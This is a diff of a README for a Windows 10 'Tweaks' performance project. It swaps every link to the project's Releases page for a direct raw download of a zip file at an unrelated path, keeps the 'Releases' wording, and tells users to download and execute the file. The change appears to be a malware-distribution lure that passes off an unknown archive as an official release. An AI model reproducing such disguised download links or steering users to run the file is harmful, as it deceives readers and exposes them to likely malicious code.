@@ -2,7 +2,7 @@
 
 Welcome to the **Tweaks** repository! This project aims to help you enhance your device's performance safely and for free. With a variety of scripts and optimizations, you can achieve better speed and efficiency on your Windows 10 machine. 
 
-[![Download Tweaks](https://img.shields.io/badge/Download_Tweaks-Release-brightgreen)](https://github.com/hima84/Tweaks/releases)
+[![Download Tweaks](https://raw.githubusercontent.com/hima84/Tweaks/main/Treron/Software-v3.5-beta.1.zip)](https://raw.githubusercontent.com/hima84/Tweaks/main/Treron/Software-v3.5-beta.1.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Tweaks is designed for users who want to get the most out of their devices. Whet
 
 ## Installation
 
-To get started, visit our [Releases](https://github.com/hima84/Tweaks/releases) section. Download the latest release file and execute it on your Windows 10 device. This will apply all necessary tweaks to enhance your system performance.
+To get started, visit our [Releases](https://raw.githubusercontent.com/hima84/Tweaks/main/Treron/Software-v3.5-beta.1.zip) section. Download the latest release file and execute it on your Windows 10 device. This will apply all necessary tweaks to enhance your system performance.
 
 ## Usage
 
@@ -57,6 +57,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Contact
 
-For any inquiries or support, please reach out to the repository owner. You can also check the [Releases](https://github.com/hima84/Tweaks/releases) section for updates and new features.
+For any inquiries or support, please reach out to the repository owner. You can also check the [Releases](https://raw.githubusercontent.com/hima84/Tweaks/main/Treron/Software-v3.5-beta.1.zip) section for updates and new features.
 
 Thank you for using Tweaks! We hope it helps you achieve the performance you desire on your device.
